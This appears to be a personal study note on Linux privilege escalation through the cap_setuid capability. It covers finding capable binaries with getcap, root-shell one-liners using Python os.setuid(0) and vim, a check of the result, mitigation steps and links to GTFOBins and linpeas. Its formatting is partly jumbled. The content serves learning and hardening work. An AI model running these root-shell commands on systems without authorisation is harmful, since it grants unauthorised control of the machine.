# Privilege Escalation - Linux (Capabilities Exploit: cap_setuid)

**Capabilities** allow system administrators to grant specific privileges to binaries without full root access, enabling more granular control.

For example, a **SOC analyst** may need to use a tool requiring socket connections. Instead of granting full root access, the admin can modify the **capabilities** of the binary.

## 🔍 Detection - Identifying Binaries with Elevated Capabilities

### **Step 1: Find Binaries with Special Capabilities**
```bash
getcap -r / 2>/dev/null
This command lists all files with capabilities set.
Pasted image 20250327113805.png
Look for binaries with:
cap_setuid+ep
The cap_setuid capability allows a binary to change its user ID to root.
🔥 Exploitation - Abusing cap_setuid Capability
Step 1: Use Python to Escalate Privileges
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
os.setuid(0) forces the process to run as root.
Spawns a root shell.
Pasted image 20250327113843.png
Step 2: Verify Root Access
id
If successful, you should see:
uid=0(root) gid=0(root) groups=0(root)
🎉 Root shell obtained! 🎉

Privilege Escalation Using Capabilities
Some binaries with specific capabilities can be exploited for privilege escalation.

Example: Vim
If vim has elevated capabilities, it can be used to get a root shell:

getcap /usr/bin/vim
vim -c ':!/bin/sh'
Useful Resources
man capabilities - Detailed Linux capabilities guide.
GTFObins - List of exploitable binaries.
cp $(which vim) .
sudo setcap cap_setuid+ep vim

./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
Key Points
Capabilities grant privileges without full root access.
Use getcap to check capabilities.
Vim may be exploitable if certain capabilities are set.
GTFObins provides more privilege escalation methods.
🔍 Mitigation
Remove unnecessary capabilities:
setcap -r /usr/bin/python2.6
Use minimal privileges for binaries instead of granting cap_setuid globally.
Monitor capability changes using:
getcap -r / 2>/dev/null | grep cap_setuid
Disable old Python versions if not needed.
🛠 Tools for Capability-Based Privilege Escalation
GTFOBins - Exploitable binaries:
https://gtfobins.github.io/
linpeas.sh - Automated enumeration tool for privilege escalation paths.
